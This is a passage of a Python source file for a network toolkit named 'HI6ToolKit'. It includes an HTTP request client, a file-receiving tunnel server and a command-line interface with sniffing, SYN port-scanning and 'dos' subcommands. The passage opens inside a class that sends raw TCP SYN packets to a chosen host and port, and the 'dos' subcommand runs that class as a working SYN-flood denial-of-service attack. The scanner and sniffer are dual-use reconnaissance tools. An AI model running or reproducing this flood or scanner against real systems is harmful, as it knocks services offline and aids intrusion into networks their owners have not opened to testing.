            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as flood :
                flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                flood.connect((self.host, self.port))
                flood.sendto(payload, (self.host, self.port))
                flood.shutdown(socket.SHUT_RDWR)
            self.count += 1
            text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(self.count, self.rate)}" + " " + f"[{self.count}/{self.rate}]"
            print(text, end = "\r", flush = True)
        else :
            end_time = round((time.time() - Constant.TIME), 2)
            print("\n[" + Constant.GREEN("+") + "]" + " " + "all SYN segments have sent")
            print("[" + Constant.GREEN("+") + "]" + " " + f"{end_time}s")
        return


class HTTP_Request :
    def __init__(self, host : str, port : int, method : str, header : str, end : str, https : bool) -> "HTTP_Request_class" :
        self.host = host
        self.port = int(port)
        self.method = method if method in ("GET", "HEAD") else "GET"
        self.header = header
        self.end = end if end else "/"
        self.https = bool(https)
        self.request_header = str()
        self.response = bytes()
        self.response_header = str()

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"HTTP_Request : \n\t{self.host}\n\t{self.port}"

    def request(self) -> None :
        self.__request()
        return

    def __request(self) -> None :
        if self.https : sslcontext = ssl.create_default_context()
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as http :
            http.settimeout(30)
            http = sslcontext.wrap_socket(http, server_hostname = self.host) if self.https else http
            payload = [
                f"{self.method} {self.end} HTTP/1.1",
                f"Host: {self.host}",
                "User-Agent: HI6ToolKit",
                "Accept: */*",
                "Connection: close",
                "\r\n"
                ] if not self.header else self.header
            payload = "\r\n".join(payload) if not self.header else payload
            self.request_header = payload
            if not Constant.MODULE : print(payload)
            http.connect((self.host, self.port))
            http.send(payload.encode())
            raw_data = bytes()
            while True :
                response = http.recv(1024)
                if not response :
                    raw_data = raw_data.split(b"\r\n\r\n", 1)
                    self.response_header = raw_data[0].decode()
                    self.response = raw_data[-1]
                    if not Constant.MODULE :
                        print(self.response_header, end = "\n\n")
                        if self.method == "GET" : print(self.response)
                    if self.https : http.close()
                    break
                else :
                    raw_data += response
        return


class Tunnel :
    def __init__(self, host : str, port : int, timeout : int, buffer : int) -> "Tunnel_class" :
        self.host = host
        self.port = port
        self.timeout = timeout
        self.buffer = buffer
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)

    def __repr__(self) -> str :
        items = "\n\t".join([f"{k} : {v}" for k, v in self.__dict__.items()])
        return f"{self.__class__}\n\t{items}"

    def __str__(self) -> str :
        return f"Tunnel : \n\t{self.host}\n\t{self.port}"

    @staticmethod
    def open_file(name : str) -> "file" :
        path = f"./{name}"
        mode = "ab" if os.path.exists(path) else "wb"
        file = open(path, mode)
        Constant.FILES.append(file)
        return file

    @staticmethod
    def tmp_file(file : "open", data : bytes) -> None :
        file.write(data)
        return

    @staticmethod
    def parse_headers(data : bytes) -> dict :
        headers = {header.split(": ", 1)[0] : header.split(": ", 1)[-1] for header in data.split("\r\n")[1:-1]}
        headers["status"] = data.split("\r\n", 1)[0].split(" ")[0]
        headers["name"] = data.split("\r\n", 1)[0].split(" ")[1][1:]
        headers["version"] = data.split("\r\n", 1)[0].split(" ")[-1]
        return headers

    @staticmethod
    def get_name(headers : dict) -> str :
        keyword = "name"
        if keyword in headers and headers[keyword] :
            return headers[keyword] + f"_{Constant.TIME}"  + ".tmp"
        else : return f"new_{Constant.TIME}.tmp"

    @staticmethod
    def get_length(headers : dict) -> int :
        keyword = "Content-Length"
        if keyword in headers :
            return int(headers[keyword])
        else : return 0

    @staticmethod
    def get_status(headers : dict) -> str | None :
        keyword = "status"
        if keyword in headers :
            return headers[keyword]
        else :
            raise Exception("couldn't find status")
            return

    @staticmethod
    def get_version(headers : dict) -> str :
        keyword = "version"
        if keyword in headers :
            return headers[keyword]
        else : return "HTTP/1.0"

    @staticmethod
    def get_parts(length : int, buffer : int) -> tuple[int, int] :
        if buffer > length : return length, 0
        npart = length // buffer
        nrimd = length % buffer
        return nrimd, npart

    @staticmethod
    def readline(sock : socket.socket) -> bytes :
        line = bytes()
        while not line.endswith(b"\r\n") :
            line += sock.recv(1)
        else : return line

    @staticmethod
    def readbuffer(sock : socket.socket, buffer : int) -> bytes :
        data = bytes()
        while len(data) != buffer :
            data += sock.recv(buffer - len(data))
        else : return data

    @staticmethod
    def write(sock : socket.socket, data : bytes) -> None :
        data = data if isinstance(data, bytes) else data.encode()
        sock.sendall(data)
        return

    @staticmethod
    def prepare_response(version : str, success : bool) -> str :
        if success :
            payload = [
            f"{version} 200 OK",
            "User-Agent: HI6ToolKit",
            "\r\n"
            ]
        else :
            payload = [
                f"{version} 400 Bad Request",
                "User-Agent: HI6ToolKit",
                "\r\n"
                ]
        payload = "\r\n".join(payload).encode()
        return payload

    @staticmethod
    def progress_bar(x : int, y : int) -> str :
        symbol = Constant.SLASH
        if y < 32 : return 32 * symbol if x == y else 0 * symbol
        sec = y // 32
        now = x // sec
        return now * symbol

    @staticmethod
    def percent(x : int, y : int) -> int :
        return round((x / y) * 100)

    def init_server(self) -> None :
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.settimeout(self.timeout)
        self.sock.bind((self.host, self.port))
        self.sock.listen(1)
        return

    def get_header(self, sock : socket.socket) -> str :
        header = bytes()
        while not header.endswith(b"\r\n\r\n") :
            header += self.readline(sock)
        else : return header.decode()

    def tunnel(self) -> None :
        self.__tunnel()
        return

    def __tunnel(self) -> None :
        print("[" + Constant.GREEN("+") + "]" + " " + "run init_server()", end = "  ", flush = True)
        self.init_server()
        print(Constant.GREEN("DONE"))
        print("[" + Constant.GREEN("+") + "]" + " " + "run socket.accept()")
        conn, addr = self.sock.accept()
        print("[" + Constant.GREEN("+") + "]" + " " + f"new connection from {addr[0]}:{addr[-1]}")
        headers = self.parse_headers(self.get_header(conn))
        print("[" + Constant.GREEN("+") + "]" + " " + "parsing header", end = "  ", flush = True)
        status, name, version, length = self.get_status(headers), self.get_name(headers), self.get_version(headers), self.get_length(headers)
        print(Constant.GREEN("DONE"))
        if not length :
            print("[" + Constant.GREEN("+") + "]" + " " + f"couldn't find Content-Length, send Bad Request to {addr[0]}:{addr[1]}", end = "  ", flush = True)
            payload = self.prepare_response(version, False)
            self.write(conn, payload)
            print(Constant.GREEN("DONE"))
            Constant.EXIT(1)
        send_length = 0
        tail, parts = self.get_parts(length, self.buffer)
        file = self.open_file(name)
        OUTPUT : str = lambda x, y : "[" + Constant.GREEN("*") + "]" + " " + self.progress_bar(x, y) + " " + f"[{self.percent(x, y)}%]" + f"[{x}/{y}]"
        while parts != 0 :
            data = self.readbuffer(conn, self.buffer)
            self.tmp_file(file, data)
            send_length += self.buffer
            print(OUTPUT(send_length, length), end = "\r", flush = True)
            parts -= 1
        else :
            data = self.readbuffer(conn, tail)
            self.tmp_file(file, data)
            file.close()
            send_length += tail
            print(OUTPUT(send_length, length), end = "\r", flush = True)
            print("\n[" + Constant.GREEN("+") + "]" + " " + f"sending OK to {addr[0]}:{addr[-1]}", end = "  ", flush = True)
            payload = self.prepare_response(version, True)
            self.write(conn, payload)
            print(Constant.GREEN("DONE"))
        return


if not Constant.MODULE :
    def manage_args() -> argparse.Namespace :
        global Sniff_args, DoS_SYN_args, HTTP_Request_args, Tunnel_args
        parser = argparse.ArgumentParser(prog = "HI6ToolKit", add_help = True)
        subparser = parser.add_subparsers(title = "tools")
        info_tool = subparser.add_parser("info", help = "print informations about os, system etc.")
        info_tool.set_defaults(func = info_args)
        sniff_tool = subparser.add_parser("sniff", help = "execute Sniff class")
        sniff_tool.add_argument("-if", "--iface", type = str, help = "sniffs on specific interface")
        sniff_tool.add_argument("-s", "--saddr", type = str, help = "process IPv4 header with specified saddr", default = None)
        sniff_tool.add_argument("-d", "--daddr", type = str, help = "process IPv4 header with specified daddr", default = None)
        sniff_tool.add_argument("-t", "--tmp", action = "store_true", help = "tmps sniffed packets in file", default = False)
        sniff_tool.add_argument("-b", "--buffer", type = int,  help = "sets socket.recvfrom buffer", default = 128 * 1024)
        sniff_tool.set_defaults(func = Sniff_args)
        scan_tool = subparser.add_parser("scan", help = "execute SYN port scanner")
        scan_tool.add_argument("-s", "--source", type = str, help = "sets source addr for scanning")
        scan_tool.add_argument("-x", "--host", type = str, help = "sets host addr for scanning")
        scan_tool.add_argument("-p", "--port_range", type = str, help = "sets range of ports for scanning", default = "0-65535")
        scan_tool.add_argument("-t", "--timeout", type = int, help = "sets timeout for unanswered syn segments", default = 5)
        scan_tool.set_defaults(func = Scan_args)
        dos_tool = subparser.add_parser("dos", help = "execute DoS_SYN class")
        dos_tool.add_argument("-x", "--host", type = str, help = "sets host for flooding")
        dos_tool.add_argument("-p", "--port", type = int, help = "sets port for flooding")
        dos_tool.add_argument("-r", "--rate", type = int, help = "sets rate(number of packets)")
        dos_tool.set_defaults(func = DoS_SYN_args)
        http_tool = subparser.add_parser("http", help = "execute HTTP_Request class")
        http_tool.add_argument("-x", "--host", type = str, help = "sets host for http request")
        http_tool.add_argument("-p", "--port", type = int, help = "sets port for http request", default = 80)
        http_tool.add_argument("-m", "--method", type = str, help = "sets request type(GET or HEAD)", default = "GET")
        http_tool.add_argument("-c", "--custom", type = str, help = "sets custome header for HTTP_Request", default = str())
        http_tool.add_argument("-e", "--endpoint", type = str, help = "sets endpoint", default = "/")
        http_tool.add_argument("-s", "--secure", action = "store_true", help = "sets secure socket(ssl)", default = False)
        http_tool.set_defaults(func = HTTP_Request_args)
        tunnel_tool = subparser.add_parser("tunnel", help = "execute Tunnel class")
        tunnel_tool.add_argument("-x", "--host", type = str, help = "sets host", default = "0.0.0.0")
        tunnel_tool.add_argument("-p", "--port", type = int, help = "sets port", default = "80")
        tunnel_tool.add_argument("-b", "--buffer", type = int, help = "sets bufferSize, should be in (1024, 2048, 4096,...)", default = 2048)
        tunnel_tool.add_argument("-t", "--timeout", type = int, help = "sets timeout", default = 60)
        tunnel_tool.set_defaults(func = Tunnel_args)
        args = parser.parse_args()
        return args

    def invalid_args(arg : str) -> None :
        msg = "[" + Constant.RED("ERROR") + "]" + " "
        msg += Constant.RED(f"Invalid argument : \"{arg}\"") + "\n"
        msg += "[" + Constant.RED("ERROR") + "]" + " "
        msg += Constant.RED("Type : \"python hi6toolkit.py [--help | -h]\"")
        print(msg, file = sys.stderr)
        Constant.EXIT(1)
        return

    def root_access_error() -> None :
        msg = "[" + Constant.RED("ERROR") + "]" + " "
        msg += Constant.RED("ROOT ACCESS ERROR") + "\n"
        print(msg)
        Constant.EXIT(1)
        return

    def check(**kwargs : dict) -> tuple[bool, None | list] :
        nones = list()
        for k, v in kwargs.items() :
            if not v : nones.append(k)
        return (True, None) if not nones else (False, nones)

    def info_args() -> None :
        print(Constant.YELLOW(Constant.INFO))
        return

    def ensure() -> None :
        if not Constant.MODULE :
            print(Constant.YELLOW(Constant.INFO))
            input("\nPress ENTER to continue...\n")
        return

    def Sniff_args() -> None :
        global args
        args = {
            "iface" : args.iface,
            "filter_saddr" : args.saddr,
            "filter_daddr" : args.daddr,
            "tmp" : args.tmp,
            "buffer" : args.buffer
            }
        success, nones = check(iface = args["iface"])
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        iface = args["iface"]
        filter_saddr = args["filter_saddr"]
        filter_daddr = args["filter_daddr"]
        tmp = args["tmp"]
        buffer = args["buffer"]
        if not Constant.ISROOT : root_access_error()
        ensure()
        sniff = Sniff(asyncio.get_event_loop(), iface, tmp, filter_saddr, filter_daddr, buffer)
        asyncio.run(sniff.sniff())

    def Scan_args() -> None :
        global args
        args = {
            "source" : args.source,
            "host" : args.host,
            "port_range" : args.port_range,
            "timeout" : args.timeout
            }
        success, nones = check(source = args["source"], host = args["host"])
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        split_port_range : tuple = lambda x : tuple([int(i) for i in x.split("-")])
        source = socket.gethostbyname(args["source"])
        host = socket.gethostbyname(args["host"])
        port_range = split_port_range(args["port_range"])
        timeout = args["timeout"]
        if not Constant.ISROOT : root_access_error()
        ensure()

        async def wait_to_empty(n : int, buffer : set | list) -> None :
            while len(buffer) >= n :
                print("[" + Constant.RED("WAIT") + "]", end = " ")
                print(f"buffer is full, {n} requests been sent, awaiting to empty buffer")
                await asyncio.sleep(1)
            return

        async def prepare() -> None :
            print("[" + Constant.GREEN("START") + "]", end = " ")
            print("set async event loop")
            loop = asyncio.get_event_loop()
            scan = Scan(source, host, timeout, loop)
            buffer = set()
            for port in range(port_range[0], port_range[1] + 1) :
                if len(buffer) >= 100 :
                    await wait_to_empty(100, buffer)
                if (port % 100 == 0) and (port != 0) :
                    await asyncio.gather(*buffer)
                task = loop.create_task(scan.scan(port))
                buffer.add(task)
                task.add_done_callback(buffer.discard)
            else :
                if buffer :
                    await asyncio.gather(*buffer)
                if len(scan.opens) :
                    print(f"\nopen ports({len(scan.opens)}) :\n\t", end = str())
                    print(" ".join([str(i) for i in sorted(scan.opens)]))
                if len(scan.unspecified) :
                    print(f"\nunspecified ports({len(scan.unspecified)}) :\n\t", end = str())
                    print(" ".join([str(i) for i in sorted(scan.unspecified)]))
                else : print("no open ports!")
                return

        asyncio.run(prepare())
        return

    def DoS_SYN_args() -> None :
        global args
        args = {
            "host" : args.host,
            "port" : args.port,
            "rate" : args.rate
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = socket.gethostbyname(args["host"])
        port = args["port"]
        rate = args["rate"]
        if not Constant.ISROOT : root_access_error()
        ensure()
        flood = DoS_SYN(host, port, rate)
        flood.flood()
        return

    def HTTP_Request_args() -> None :
        global args
        args = {
            "host" : args.host,
            "port" : args.port,
            "method" : args.method,
            "header" : args.custom,
            "endpoint" : args.endpoint,
            "secure" : args.secure
            }
        success, nones = check(host = args["host"], port = args["port"], method = args["method"])
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = args["host"]
        port = args["port"]
        method = args["method"].upper()
        header = args["header"].replace("_", "\r\n")
        path = args["endpoint"]
        secure = args["secure"]
        ensure()
        client = HTTP_Request(host, port, method, header, path, secure)
        client.request()
        return

    def Tunnel_args() -> None :
        global args
        args = {
            "host" :  args.host,
            "port" : args.port,
            "timeout" :  args.timeout,
            "buffer" : args.buffer
            }
        success, nones = check(**args)
        if not success : invalid_args(" & ".join(nones) + " " + "NOT found")
        host = args["host"]
        port = args["port"]
        timeout = args["timeout"]
        buffer = args["buffer"]
        if not Constant.ISROOT and port <= 1024 : root_access_error()
        ensure()
        tunnel = Tunnel(host, port, timeout, buffer)
        gen = tunnel.tunnel()
        return

    def main() -> bool :
        global args
        print(Constant.ESCAPE + "c")
        signal.signal(signal.SIGINT, Constant.SIGNAL)
        signal.signal(signal.SIGTERM, Constant.SIGNAL)
        if not Constant.ISOS :
            print("unsupported OS")
            Constant.EXIT(1)
        args = manage_args()
        if "func" in vars(args) :
            args.func()
        else :
            invalid_args("argument NOT found")
        return True

    main()
